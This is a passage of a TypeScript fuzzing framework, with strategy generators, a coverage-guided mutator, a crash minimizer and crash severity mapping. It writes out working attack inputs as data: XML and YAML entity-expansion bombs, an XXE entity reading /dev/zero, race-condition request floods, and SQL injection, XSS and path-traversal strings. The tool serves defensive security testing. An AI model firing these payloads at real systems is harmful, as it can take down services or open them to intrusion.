        raceWindow: scenario.swap,
        exploit: `Thread 1: ${scenario.check} -> ${scenario.use}\nThread 2: ${scenario.swap}\nRace: Interleave Thread 2 between Thread 1's check and use`,
        mitigation: 'Use O_NOFOLLOW, fstat instead of stat, or use open+fstat+mmap atomically',
      });
    },
  },

  // ==================================================================
  // 19. integer-wraparound — NEW
  // ==================================================================
  {
    name: 'integer-wraparound',
    description: 'Generate values near INT_MAX, INT_MIN, UINT_MAX boundaries to trigger integer overflow/wraparound',
    category: 'boundary',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * INTEGER_WRAPAROUND_VALUES.length);
      const val = INTEGER_WRAPAROUND_VALUES[idx];

      // Wrap in a scenario description for context
      return JSON.stringify({
        type: 'integer-wraparound',
        value: typeof val === 'bigint' ? val.toString() : val,
        valueType: typeof val === 'bigint' ? 'BigInt' : typeof val === 'number' ? 'Number' : 'unknown',
        scenarios: [
          `malloc(${typeof val === 'bigint' ? val.toString() : val} + 1)`,  // Integer overflow leading to small allocation
          `for (int i = ${typeof val === 'bigint' ? val.toString() : val}; i < ${typeof val === 'bigint' ? val.toString() : val} + 100; i++)`,  // Loop wraparound
          `buf[${typeof val === 'bigint' ? val.toString() : val}] = '\\0'`,  // Array index wraparound
          `unsigned int size = ${typeof val === 'bigint' ? val.toString() : val}; char *p = malloc(size);`,  // Allocation with boundary size
        ].join('\n'),
      });
    },
  },

  // ==================================================================
  // 20. floating-point-edge — NEW
  // ==================================================================
  {
    name: 'floating-point-edge',
    description: 'Generate NaN, Inf, -Inf, -0, denormalized numbers and other floating-point edge cases',
    category: 'boundary',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * FLOATING_POINT_EDGES.length);
      const val = FLOATING_POINT_EDGES[idx];

      // Return the actual floating point value + a serialization-safe description
      return JSON.stringify({
        type: 'floating-point-edge',
        value: Object.is(val, -0) ? '-0' : val === Infinity ? 'Infinity' : val === -Infinity ? '-Infinity' : Number.isNaN(val) ? 'NaN' : val,
        rawValue: val,  // Actual number value for direct use
        category: Number.isNaN(val) ? 'NaN' :
                   val === Infinity ? 'PositiveInfinity' :
                   val === -Infinity ? 'NegativeInfinity' :
                   Object.is(val, -0) ? 'NegativeZero' :
                   val === 0 ? 'Zero' :
                   Math.abs(val) < Number.MIN_VALUE ? 'Denormalized' :
                   'Normal',
        description: Number.isNaN(val) ? 'Not-a-Number: can break comparison logic' :
                      val === Infinity ? 'Positive Infinity: overflow behavior' :
                      val === -Infinity ? 'Negative Infinity: underflow behavior' :
                      Object.is(val, -0) ? 'Negative zero: differs from 0 in 1/0 division and string comparison' :
                      val === 0 ? 'Zero' :
                      Math.abs(val) < Number.MIN_VALUE ? 'Denormalized number: may cause performance traps on some CPUs' :
                      'Normal floating point value',
      });
    },
  },

  // ==================================================================
  // 21. recursion-depth — NEW
  // ==================================================================
  {
    name: 'recursion-depth',
    description: 'Generate deeply nested recursive structures (JSON, XML, function calls) to trigger stack overflow',
    category: 'structure',
    generator: (_seed: unknown) => {
      const depth = Math.floor(Math.random() * 50000) + 100; // 100 to ~50,000 depth

      const recursiveFormats = [
        // Deeply nested JSON
        () => {
          let json = '{"value": 1}';
          for (let i = 0; i < depth; i++) {
            json = `{"nested": ${json}}`;
          }
          return json;
        },
        // Deeply nested XML
        () => {
          let xml = '<root>';
          for (let i = 0; i < depth; i++) {
            xml += '<a>';
          }
          for (let i = 0; i < depth; i++) {
            xml += '</a>';
          }
          xml += '</root>';
          return xml;
        },
        // Deeply nested arrays
        () => {
          let arr = '[1]';
          for (let i = 0; i < depth; i++) {
            arr = `[${arr}]`;
          }
          return arr;
        },
        // Deeply nested function calls
        () => {
          let fn = 'f(1)';
          for (let i = 0; i < depth; i++) {
            fn = `f(${fn})`;
          }
          return fn;
        },
        // Deeply nested conditionals
        () => {
          let cond = 'true';
          for (let i = 0; i < depth; i++) {
            cond = `a ? ${cond} : b`;
          }
          return cond;
        },
        // Deeply nested template literals (JS)
        () => {
          let tmpl = 'x';
          for (let i = 0; i < depth; i++) {
            tmpl = `\${${tmpl}}`;
          }
          return tmpl;
        },
      ];

      const format = recursiveFormats[Math.floor(Math.random() * recursiveFormats.length)];
      return JSON.stringify({
        type: 'recursion-depth',
        depth,
        format: format.name,
        payload: format(),
        description: `Deeply nested structure with ${depth} levels. May trigger stack overflow in parsers using recursive descent.`,
      });
    },
  },

  // ==================================================================
  // 22. race-window — NEW
  // ==================================================================
  {
    name: 'race-window',
    description: 'Generate rapid-fire repeated inputs to exploit small race windows',
    category: 'logic',
    generator: (_seed: unknown) => {
      // Produce a test harness that fires many rapid concurrent requests
      const concurrency = Math.floor(Math.random() * 50) + 10; // 10-60 concurrent
      const iterations = Math.floor(Math.random() * 100) + 20; // 20-120 iterations per thread

      const racePayloads = [
        // HTTP request racing
        `const promises = [];\nfor (let i = 0; i < ${concurrency}; i++) {\n  promises.push(fetch('/api/resource', {\n    method: 'POST',\n    headers: {'Content-Type': 'application/json'},\n    body: JSON.stringify({key: 'race-'+i, value: 'pwned'})\n  }));\n}\nawait Promise.all(promises);`,

        // File operation racing
        `const fds = [];\nfor (let i = 0; i < ${concurrency}; i++) {\n  fds.push(fs.openSync('/tmp/racefile', 'w'));\n}\nfds.forEach(fd => fs.writeSync(fd, 'data'));\nfds.forEach(fd => fs.closeSync(fd));`,

        // Database transaction racing
        `const txns = [];\nfor (let i = 0; i < ${concurrency}; i++) {\n  txns.push(db.transaction(async (trx) => {\n    await trx('accounts').decrement('balance', 100).where('id', 1);\n    await trx('accounts').increment('balance', 100).where('id', 2);\n  }).execute());\n}\nawait Promise.all(txns);`,

        // Lock racing
        `for (let i = 0; i < ${iterations}; i++) {\n  lock.acquire();\n  // critical section\n  counter++;\n  lock.release();\n}`,

        // Auth token racing
        `const tokens = [];\nfor (let i = 0; i < ${concurrency}; i++) {\n  tokens.push(auth.refreshToken('user-1'));\n}\nconst results = await Promise.all(tokens);`,

        // Non-atomic check-then-act race
        `for (let i = 0; i < ${concurrency}; i++) {\n  if (counter < ${iterations}) {\n    counter++; // Race: two threads can pass the check simultaneously\n  }\n}`,

        // Session racing
        `const sessions = [];\nfor (let i = 0; i < ${concurrency}; i++) {\n  sessions.push(api.createSession({user: 'admin-'+i}));\n}\nawait Promise.all(sessions);`,
      ];

      const payload = racePayloads[Math.floor(Math.random() * racePayloads.length)];
      return JSON.stringify({
        type: 'race-condition-test',
        concurrency,
        iterationsPerThread: iterations,
        estimatedTotalOps: concurrency * iterations,
        payload,
        description: `Race window test with ${concurrency} concurrent threads, ${iterations} iterations each. Designed to trigger data races, TOCTOU, and non-atomic operation conflicts.`,
      });
    },
  },

  // ==================================================================
  // 23. encoding-stacking — NEW
  // ==================================================================
  {
    name: 'encoding-stacking',
    description: 'Generate inputs with multiple layers of encoding (base64 -> url -> base64 -> url) to bypass filters',
    category: 'encoding',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * ENCODING_STACK_PAYLOADS.length);
      const encoded = ENCODING_STACK_PAYLOADS[idx];

      // Determine the encoding chain used
      const chains = [
        'base64(url(original))',
        'url(base64(original))',
        'base64(url(base64(original)))',
        'base64(url(base64(url(original))))',
        'hex -> base64 -> url',
        'unicode-escape stacking',
        'html-entity stacking',
      ];
      const chain = chains[Math.floor(Math.random() * chains.length)];

      return JSON.stringify({
        type: 'encoding-stack',
        encodingChain: chain,
        encodedPayload: encoded,
        decodedHint: 'Requires reversing the encoding chain to get the original payload',
        risk: 'May bypass WAF, input filters, and sanitization that only decode one layer',
      });
    },
  },

  // ==================================================================
  // 24. billion-laughs — NEW
  // ==================================================================
  {
    name: 'billion-laughs',
    description: 'Generate entity expansion bomb payloads for XML/YAML parsers (billion laughs attack)',
    category: 'resource',
    generator: (_seed: unknown) => {
      const variants = [
        // Classic XML billion laughs
        () => generateBillionLaughs(),
        // YAML billion laughs (using anchors/aliases)
        () => generateYamlBillionLaughs(),
        // Quadratic blowup via deeply nested entities
        () => {
          const lines: string[] = [];
          lines.push('<?xml version="1.0"?>');
          lines.push('<!DOCTYPE foo [');
          for (let i = 0; i < 50000; i++) {
            lines.push(`  <!ENTITY x${i} "AAAA${i > 0 ? `&x${i-1};` : ''}">`);
          }
          lines.push(']>');
          lines.push('<foo>&x49999;</foo>');
          return lines.join('\n');
        },
        // Recursive entity expansion
        () => '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY x "&x;&x;">]>\n<foo>&x;</foo>',
        // Decompression bomb via deeply nested tags
        () => {
          let xml = '<?xml version="1.0"?>\n<root>';
          for (let i = 0; i < 100000; i++) {
            xml += '<a>';
          }
          xml += 'X';
          for (let i = 0; i < 100000; i++) {
            xml += '</a>';
          }
          xml += '</root>';
          return xml;
        },
        // Mixed: DTD with external entity + local expansion
        () => `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/zero">
  <!ENTITY bomb "&xxe;&xxe;&xxe;&xxe;&xxe;">
]>
<foo>&bomb;</foo>`,
      ];

      const variant = variants[Math.floor(Math.random() * variants.length)];
      return JSON.stringify({
        type: 'billion-laughs',
        subType: variant.name,
        payload: variant(),
        description: 'Entity expansion bomb. Expands exponentially or quadratically to exhaust parser memory.',
        expansionRatio: 'Exponential (e.g., 10^9 expansion for 12 entities) or Quadratic (e.g., 50000 entities = ~2.5B expansions)',
        risk: 'Memory exhaustion, parser hang, denial of service',
      });
    },
  },

  // ==================================================================
  // 25. zip-bomb-precursor — NEW
  // ==================================================================
  {
    name: 'zip-bomb-precursor',
    description: 'Generate highly compressible content (100KB that expands to 100MB+) for decompression bomb testing',
    category: 'resource',
    generator: (_seed: unknown) => {
      const variants = [
        // Repeated pattern: gzip compresses this extremely well (~1000:1 ratio)
        () => {
          const pattern = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          const repeat = Math.floor(Math.random() * 10000) + 1000;
          return pattern.repeat(repeat);
        },
        // Null-byte heavy: compresses to almost nothing
        () => Buffer.alloc(5 * 1024 * 1024, 0).toString('binary'),  // 5MB of nulls
        // Highly redundant structured data
        () => {
          const rows: string[] = [];
          const rowCount = Math.floor(Math.random() * 200000) + 50000;
          const template = '{"id":%d,"name":"user-%d","email":"user-%d@example.com","role":"user","department":"engineering","location":"remote"},';
          for (let i = 0; i < rowCount; i++) {
            rows.push(JSON.stringify({
              id: i,
              name: `user-${i}`,
              email: `user-${i}@example.com`,
              role: 'user',
              department: 'engineering',
              location: 'remote',
              metadata: {
                created: '2024-01-01',
                status: 'active',
                tier: 'standard',
              },
            }));
          }
          return '[' + rows.join(',') + ']';
        },
        // Whitespace-heavy payload
        () => ' '.repeat(10 * 1024 * 1024),  // 10MB of spaces
        // Repeated CSS-like rules
        () => {
          const cssBlock = '.class-XXXXX { color: #fff; background: #000; font-size: 12px; margin: 0; padding: 0; }\n';
          return cssBlock.replace(/XXXXX/g, () => Math.floor(Math.random() * 100000).toString()).repeat(500000);
        },
      ];

      const variant = variants[Math.floor(Math.random() * variants.length)];
      const payload = variant();
      const originalSize = Buffer.byteLength(payload);
      const estimatedCompressedSize = Math.max(1, Math.floor(originalSize / 1000)); // ~1000:1 compression

      return JSON.stringify({
        type: 'zip-bomb-precursor',
        subType: variant.name,
        originalSizeBytes: originalSize,
        estimatedCompressedSizeBytes: estimatedCompressedSize,
        compressionRatio: (originalSize / estimatedCompressedSize).toFixed(0) + ':1',
        payload: payload,
        description: `Highly compressible payload: ${(originalSize / 1024 / 1024).toFixed(1)}MB uncompressed, compresses to ~${(estimatedCompressedSize / 1024).toFixed(1)}KB. Tests decompression bomb vulnerabilities.`,
        risk: 'If automatically decompressed, may exhaust available memory. Test gzip/unzip, gunzip, inflate, and other decompression routines.',
      });
    },
  },

  // ==================================================================
  // 26. sql-injection — enhanced from original context
  // ==================================================================
  {
    name: 'sql-injection',
    description: 'Test SQL injection with various evasion techniques',
    category: 'injection',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * SQL_INJECTION_PAYLOADS.length);
      return SQL_INJECTION_PAYLOADS[idx];
    },
  },

  // ==================================================================
  // 27. command-injection — enhanced from original context
  // ==================================================================
  {
    name: 'command-injection',
    description: 'Test command injection with various evasion techniques',
    category: 'injection',
    generator: (_seed: unknown) => {
      const idx = Math.floor(Math.random() * COMMAND_INJECTION_PAYLOADS.length);
      return COMMAND_INJECTION_PAYLOADS[idx];
    },
  },
];

// ============================================================
// COVERAGE-GUIDED SMART MUTATION ENGINE
// ============================================================

/**
 * Generate smart mutations guided by code coverage feedback.
 *
 * Takes a seed input and a coverage map, then produces a mutated input
 * biased toward exploring uncovered paths.  Implements bit-flip,
 * byte-flip, arithmetic (add/sub near interesting values), and
 * dictionary-based mutations.
 *
 * @param seed     - The seed input to mutate (string or Buffer).
 * @param coverage - Optional coverage map from previous runs to guide mutations.
 * @returns A MutationResult containing the mutated input and expected coverage improvement.
 */
export function generateSmartMutations(
  seed: unknown,
  coverage?: CoverageMap,
): MutationResult {
  // Normalize seed to a string
  const seedStr = typeof seed === 'string'
    ? seed
    : seed instanceof Buffer
      ? seed.toString('binary')
      : JSON.stringify(seed);

  if (seedStr.length === 0) {
    return { mutatedInput: 'A', expectedCoverageDelta: 0 };
  }

  // Determine which mutation strategies are available based on length
  const mutations: Array<() => string> = [];

  // --- Bit-flip mutation ---
  mutations.push(() => {
    const buf = Buffer.from(seedStr, 'utf-8');
    const pos = Math.floor(Math.random() * buf.length);
    const bit = 1 << Math.floor(Math.random() * 8);
    buf[pos] ^= bit;
    return buf.toString('utf-8');
  });

  // --- Byte-flip mutation (swap two bytes) ---
  if (seedStr.length >= 2) {
    mutations.push(() => {
      const arr = [...seedStr];
      const i = Math.floor(Math.random() * arr.length);
      let j = Math.floor(Math.random() * arr.length);
      while (j === i) j = Math.floor(Math.random() * arr.length);
      [arr[i], arr[j]] = [arr[j], arr[i]];
      return arr.join('');
    });
  }

  // --- Arithmetic mutation: add/sub small delta near boundaries ---
  mutations.push(() => {
    const deltas = [1, -1, 2, -2, 8, -8, 16, -16, 255, -255, 256, -256];
    const delta = deltas[Math.floor(Math.random() * deltas.length)];
    return seedStr.split('').map(c => {
      if (Math.random() < 0.1) {
        return String.fromCharCode(c.charCodeAt(0) + delta);
      }
      return c;
    }).join('');
  });

  // --- Dictionary-based mutation: splice in interesting values ---
  mutations.push(() => {
    const dict = [
      '\x00', '\xff', '\x7f', '\x80',
      '\n', '\r\n', '\t', '\0',
      'NaN', 'Infinity', 'undefined', 'null',
      '<script>', '</script>', '../', '..\\',
      "' OR 1=1 --", '" OR "x"="x',
      '${7*7}', '#{7*7}',
    ];
    const word = dict[Math.floor(Math.random() * dict.length)];
    const pos = Math.floor(Math.random() * seedStr.length);
    return seedStr.slice(0, pos) + word + seedStr.slice(pos);
  });

  // --- Boundary-clamp arithmetic (force values to wrap near type extremes) ---
  mutations.push(() => {
    const extremes = [0x00, 0x7f, 0x80, 0xff, 0x7fff, 0x8000, 0xffff];
    if (seedStr.length < 2) return seedStr + '\x00';
    const pos = Math.floor(Math.random() * (seedStr.length - 1));
    const ext = extremes[Math.floor(Math.random() * extremes.length)];
    const buf = Buffer.from(seedStr, 'utf-8');
    buf[pos] = ext & 0xff;
    if (pos + 1 < buf.length) buf[pos + 1] = (ext >> 8) & 0xff;
    return buf.toString('utf-8');
  });

  // --- Coverage-biased mutation ---
  mutations.push(() => {
    if (!coverage) {
      // No coverage data: fall back to random byte insertion
      const buf = Buffer.from(seedStr, 'utf-8');
      const pos = Math.floor(Math.random() * (buf.length + 1));
      const byteVal = Math.floor(Math.random() * 256);
      const ins = Buffer.alloc(1);
      ins[0] = byteVal;
      return Buffer.concat([buf.slice(0, pos), ins, buf.slice(pos)]).toString('binary');
    }

    // We have coverage data: try to trigger uncovered branches
    // Find uncovered files/lines
    const uncoveredLines: Array<{ file: string; line: string }> = [];
    for (const [file, lines] of Object.entries(coverage)) {
      for (const [line, count] of Object.entries(lines)) {
        if (count === 0) {
          uncoveredLines.push({ file, line });
        }
      }
    }

    if (uncoveredLines.length === 0) {
      // All covered: just add randomness
      return seedStr + Math.random().toString(36);
    }

    // Pick a random uncovered line and try to craft input that reaches it
    const target = uncoveredLines[Math.floor(Math.random() * uncoveredLines.length)];
    // Embed a hint about what we're targeting
    return seedStr + `/* TARGET_COV: ${target.file}:${target.line} */`;
  });

  // --- Length extension / truncation ---
  mutations.push(() => {
    const action = Math.random();
    if (action < 0.33) {
      // Extend by repeating last char
      const extraLen = Math.floor(Math.random() * 100) + 1;
      return seedStr + seedStr[seedStr.length - 1].repeat(extraLen);
    } else if (action < 0.66) {
      // Truncate
      const truncLen = Math.floor(Math.random() * Math.min(seedStr.length, 100)) + 1;
      return seedStr.slice(0, Math.max(1, seedStr.length - truncLen));
    } else {
      // Extend with interesting bytes
      const interesting = '\x00\xff\x7f\x80\xfe\x01\x81\x41';
      const extraLen = Math.floor(Math.random() * 50) + 1;
      let ext = '';
      for (let i = 0; i < extraLen; i++) {
        ext += interesting[Math.floor(Math.random() * interesting.length)];
      }
      return seedStr + ext;
    }
  });

  // --- Magic-byte insertion at random positions ---
  mutations.push(() => {
    const magicValues = [
      Buffer.from([0x00, 0x00, 0x00, 0x00]),     // Null dword
      Buffer.from([0xff, 0xff, 0xff, 0xff]),     // -1 dword
      Buffer.from([0x89, 0x50, 0x4e, 0x47]),     // PNG magic
      Buffer.from([0x7f, 0x45, 0x4c, 0x46]),     // ELF magic
      Buffer.from([0x25, 0x50, 0x44, 0x46]),     // PDF magic
      Buffer.from([0xd0, 0xcf, 0x11, 0xe0]),     // OLE2 magic
      Buffer.from([0xef, 0xbb, 0xbf]),           // UTF-8 BOM
      Buffer.from([0xfe, 0xff]),                 // UTF-16 BE BOM
      Buffer.from([0xff, 0xfe]),                 // UTF-16 LE BOM
      Buffer.from([0x1f, 0x8b]),                 // gzip magic
    ];
    const magic = magicValues[Math.floor(Math.random() * magicValues.length)];
    const buf = Buffer.from(seedStr, 'utf-8');
    const pos = Math.floor(Math.random() * (buf.length + 1));
    return Buffer.concat([buf.slice(0, pos), magic, buf.slice(pos)]).toString('binary');
  });

  // --- Interesting-integer insertion (for parsers expecting numeric input) ---
  mutations.push(() => {
    const interestingInts = [
      '0', '-1', '1', '2147483647', '-2147483648',
      '4294967295', '32767', '-32768',
      '9223372036854775807', '-9223372036854775808',
      'NaN', 'Infinity', '-Infinity', '0.0', '-0.0',
      '1e-308', '1e308',
      '0xFFFFFFFF', '0x0', '0x1', '0xDEADBEEF',
      '00', ' 0', '0 ', '0\n', '0\t',
    ];
    const val = interestingInts[Math.floor(Math.random() * interestingInts.length)];
    return val + seedStr;
  });

  // Shuffle and pick one mutation strategy
  const chosen = mutations[Math.floor(Math.random() * mutations.length)]();
  const delta = coverage
    ? Object.values(coverage).reduce((sum, lines) => {
        const uncovered = Object.values(lines).filter(c => c === 0).length;
        return sum + (coverage && uncovered > 0 ? 0.5 : 0);
      }, 0)
    : 0.0;

  return {
    mutatedInput: chosen,
    expectedCoverageDelta: delta,
  };
}

// ============================================================
// CRASH INPUT MINIMIZER (Delta Debugging)
// ============================================================

/**
 * Use delta debugging to shrink a crash input to the minimal reproducing case.
 *
 * Iteratively removes chunks from the input and checks if the crash still
 * reproduces via the provided target function.  Returns the smallest input
 * that still triggers the crash.
 *
 * @param crashInput - The original input that triggers a crash.
 * @param targetFn   - A function that runs the input and returns true if the
 *                     crash reproduces.
 * @param options    - Optional configuration.
 * @returns The minimized input (same type as crashInput).
 */
export function minimizeCrashInput<T>(
  crashInput: T,
  targetFn: (input: T) => boolean,
  options?: {
    /** Initial chunk size (default: half the input length). */
    initialChunkSize?: number;
    /** Minimum chunk size to try (default: 1). */
    minChunkSize?: number;
    /** Maximum iterations before giving up (default: 1000). */
    maxIterations?: number;
  },
): T {
  // Convert input to a string for chunk-based minimization
  const inputStr = typeof crashInput === 'string'
    ? crashInput
    : crashInput instanceof Buffer
      ? crashInput.toString('binary')
      : JSON.stringify(crashInput);

  if (inputStr.length <= 1) return crashInput;

  const minChunkSize = options?.minChunkSize ?? 1;
  const maxIterations = options?.maxIterations ?? 1000;

  // We'll maintain the current best (smallest) reproducing input
  let current = inputStr;
  let chunkSize = options?.initialChunkSize ?? Math.floor(inputStr.length / 2);
  let iterations = 0;

  while (chunkSize >= minChunkSize && iterations < maxIterations) {
    let madeProgress = false;

    // Try removing each chunk of the current size
    for (let offset = 0; offset < current.length && iterations < maxIterations; offset += chunkSize) {
      iterations++;

      // Remove chunk at [offset, offset + chunkSize)
      const candidate = current.slice(0, offset) + current.slice(offset + chunkSize);

      if (candidate.length === 0) continue;

      // Convert candidate back to the original type
      let candidateInput: T;
      if (crashInput instanceof Buffer) {
        candidateInput = Buffer.from(candidate, 'binary') as unknown as T;
      } else if (typeof crashInput === 'string') {
        candidateInput = candidate as unknown as T;
      } else {
        // For non-string inputs, try JSON.parse; if that fails, skip
        try {
          candidateInput = JSON.parse(candidate) as T;
        } catch {
          continue;
        }
      }

      // Check if the crash still reproduces
      try {
        const crashReproduces = targetFn(candidateInput);
        if (crashReproduces) {
          // Crash reproduces with smaller input — keep it
          current = candidate;
          madeProgress = true;
          // Reset offset to re-scan from the beginning with the new shorter input
          offset = -chunkSize; // will be incremented to 0 by loop
        }
      } catch {
        // targetFn itself threw while evaluating — this is unexpected but
        // means the candidate didn't crash in the expected way; skip it
        continue;
      }
    }

    if (!madeProgress) {
      // No progress at this granularity; halve the chunk size
      chunkSize = Math.max(minChunkSize, Math.floor(chunkSize / 2));
    }
  }

  // Convert back to original type
  if (typeof crashInput === 'string') {
    return current as unknown as T;
  }
  if (crashInput instanceof Buffer) {
    return Buffer.from(current, 'binary') as unknown as T;
  }
  try {
    return JSON.parse(current) as T;
  } catch {
    // If we can't parse back, return the original input
    return crashInput;
  }
}

// ============================================================
// CRASH SIGNATURE COMPUTATION
// ============================================================

/**
 * Compute a deterministic crash signature from crash data.
 *
 * Hashes stack trace + crash type + signal number to produce a
 * unique, deterministic string suitable for deduplicating crashes
 * across multiple fuzz runs.
 *
 * @param crashData - The crash data to compute a signature for.
 * @returns A hex string uniquely identifying this crash class.
 */
export function computeCrashSignature(crashData: CrashData): string {
  const hash = createHash('sha256');

  // Normalize stack trace: strip addresses, file paths, and line numbers
  // so that the same crash on different runs/different machines produces
  // the same signature.
  let normalizedStack = crashData.stackTrace || '';

  // Remove memory addresses (e.g., 0x7fff1234, 0x55a1b2c3d4e5)
  normalizedStack = normalizedStack.replace(/0x[0-9a-fA-F]+/g, '0xADDR');

  // Remove file paths (preserve function names)
  normalizedStack = normalizedStack.replace(/\/[\w./-]+\/([\w.-]+)/g, '$1');

  // Remove line number patterns (:123 or :123:456)
  normalizedStack = normalizedStack.replace(/:(\d+)(:\d+)?/g, ':LINE');

  // Remove thread IDs and timestamps
  normalizedStack = normalizedStack.replace(/Thread \d+/g, 'Thread N');
  normalizedStack = normalizedStack.replace(/\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/g, 'TIMESTAMP');

  // Remove address offsets (+1234)
  normalizedStack = normalizedStack.replace(/\+0x[0-9a-fA-F]+/g, '+OFFSET');

  // Build the canonical crash string
  const canonicalParts = [
    `type=${crashData.crashType}`,
    `signal=${crashData.signalNumber ?? 0}`,
    `exit=${crashData.exitCode ?? 0}`,
    `exception=${crashData.exceptionType ?? 'none'}`,
    `stack=${normalizedStack.slice(0, 2000)}`,  // Cap stack trace length
  ];

  hash.update(canonicalParts.join('|'));
  return hash.digest('hex').slice(0, 20); // First 20 hex chars = 80 bits, sufficient for dedup
}

// ============================================================
// FUZZ CASE GENERATION
// ============================================================

export function generateFuzzCases(
  target: FuzzTarget,
  iterationCount: number = 1000,
): FuzzCase[] {
  const cases: FuzzCase[] = [];
  const strategies = selectStrategiesForTarget(target);

  for (let i = 0; i < iterationCount; i++) {
    const strategy = strategies[Math.floor(Math.random() * strategies.length)];
    const input = strategy.generator(null);

    cases.push({
      iteration: i + 1,
      strategy: strategy.name,
      input,
      inputSize: typeof input === 'string' ? Buffer.byteLength(input, 'utf-8') :
                 input instanceof Buffer ? input.length :
                 JSON.stringify(input).length,
      mutatedFrom: i > 0 ? `iteration-${Math.floor(Math.random() * i)}` : undefined,
    });
  }

  return cases;
}

// ============================================================
// STRATEGY SELECTION
// ============================================================

function selectStrategiesForTarget(target: FuzzTarget): FuzzStrategy[] {
  const strategyMap: Record<string, string[]> = {
    rest_api: [
      'boundary-integers', 'unicode-edge-cases', 'oversized-inputs',
      'null-byte-injection', 'json-edge-cases', 'type-confusion',
      'http-smuggling', 'path-traversal', 'integer-wraparound',
      'sql-injection', 'command-injection', 'race-window',
      'encoding-stacking', 'buffer-overflow-precise',
    ],
    graphql: [
      'nested-structures', 'json-edge-cases', 'type-confusion',
      'oversized-inputs', 'unicode-edge-cases', 'sql-injection',
      'integer-wraparound', 'recursion-depth', 'encoding-stacking',
      'off-by-n', 'boundary-integers',
    ],
    soap: [
      'xml-malformed', 'oversized-inputs', 'unicode-edge-cases',
      'boundary-integers', 'billion-laughs', 'recursion-depth',
      'encoding-stacking', 'integer-wraparound',
    ],
    json_parser: [
      'json-edge-cases', 'nested-structures', 'type-confusion',
      'oversized-inputs', 'unicode-edge-cases', 'recursion-depth',
      'integer-wraparound', 'floating-point-edge', 'off-by-n',
      'encoding-stacking', 'command-injection',
    ],
    xml_parser: [
      'xml-malformed', 'oversized-inputs', 'nested-structures',
      'unicode-edge-cases', 'null-byte-injection', 'billion-laughs',
      'recursion-depth', 'encoding-stacking', 'zip-bomb-precursor',
      'boundary-integers',
    ],
    file_parser: [
      'random-bytes', 'oversized-inputs', 'null-byte-injection',
      'unicode-edge-cases', 'format-strings', 'zip-bomb-precursor',
      'buffer-overflow-precise', 'off-by-n', 'double-free',
      'use-after-free', 'integer-wraparound',
    ],
    cli_parser: [
      'format-strings', 'path-traversal', 'oversized-inputs',
      'unicode-edge-cases', 'command-injection', 'integer-wraparound',
      'off-by-n', 'encoding-stacking', 'floating-point-edge',
    ],
    config_parser: [
      'json-edge-cases', 'nested-structures', 'type-confusion',
      'unicode-edge-cases', 'boundary-integers', 'encoding-stacking',
      'integer-wraparound', 'recursion-depth',
    ],
    serialization: [
      'nested-structures', 'type-confusion', 'json-edge-cases',
      'null-byte-injection', 'oversized-inputs', 'recursion-depth',
      'double-free', 'use-after-free', 'off-by-n',
      'floating-point-edge', 'integer-wraparound',
    ],
    deserialization: [
      'type-confusion', 'json-edge-cases', 'nested-structures',
      'random-bytes', 'null-byte-injection', 'encoding-stacking',
      'billion-laughs', 'double-free', 'use-after-free',
      'recursion-depth', 'buffer-overflow-precise',
    ],
    regex: [
      'regex-redos', 'oversized-inputs', 'unicode-edge-cases',
      'null-byte-injection', 'encoding-stacking',
    ],
    input_validation: [
      'boundary-integers', 'unicode-edge-cases', 'type-confusion',
      'null-byte-injection', 'oversized-inputs', 'format-strings',
      'encoding-stacking', 'integer-wraparound', 'floating-point-edge',
      'off-by-n', 'command-injection', 'sql-injection',
      'race-window', 'path-traversal',
    ],
    auth_workflow: [
      'type-confusion', 'null-byte-injection', 'boundary-integers',
      'http-smuggling', 'race-window', 'encoding-stacking',
      'sql-injection', 'command-injection', 'integer-wraparound',
    ],
    custom: FUZZ_STRATEGIES.map(s => s.name),
  };

  const allowedNames = strategyMap[target.type] || FUZZ_STRATEGIES.map(s => s.name);
  return FUZZ_STRATEGIES.filter(s => allowedNames.includes(s.name));
}

// ============================================================
// CRASH ANALYSIS
// ============================================================

export function analyzeCrash(result: FuzzResult): {
  crashType: string;
  severity: string;
  cweId: string;
  cvssScore: number;
  cvssVector: string;
  recommendation: string;
} {
  const crashMap: Record<string, {
    type: string; severity: string; cwe: string; cvss: number;
    vector: string; rec: string;
  }> = {
    segfault: {
      type: 'segfault', severity: 'high', cwe: 'CWE-122',
      cvss: 7.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
      rec: 'Investigate memory access pattern. Use bounds checking and safe memory operations.',
    },
    panic: {
      type: 'panic', severity: 'medium', cwe: 'CWE-248',
      cvss: 5.0, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L',
      rec: 'Add proper error handling. Use recover/defer in Go, catch blocks in other languages.',
    },
    exception: {
      type: 'exception', severity: 'medium', cwe: 'CWE-248',
      cvss: 4.0, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L',
      rec: 'Wrap input handling in try-catch. Validate inputs before processing.',
    },
    stack_overflow: {
      type: 'stack_overflow', severity: 'high', cwe: 'CWE-121',
      cvss: 7.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
      rec: 'Limit recursion depth. Use iterative algorithms for unbounded data. Set stack limits.',
    },
    memory_exhaustion: {
      type: 'memory_exhaustion', severity: 'high', cwe: 'CWE-789',
      cvss: 7.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
      rec: 'Implement input size limits. Use streaming/chunked processing for large inputs.',
    },
    timeout: {
      type: 'timeout', severity: 'medium', cwe: 'CWE-400',
      cvss: 5.0, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L',
      rec: 'Add timeout handling. Consider algorithmic complexity. Use non-backtracking regex.',
    },
    resource_exhaustion: {
      type: 'resource_exhaustion', severity: 'medium', cwe: 'CWE-400',
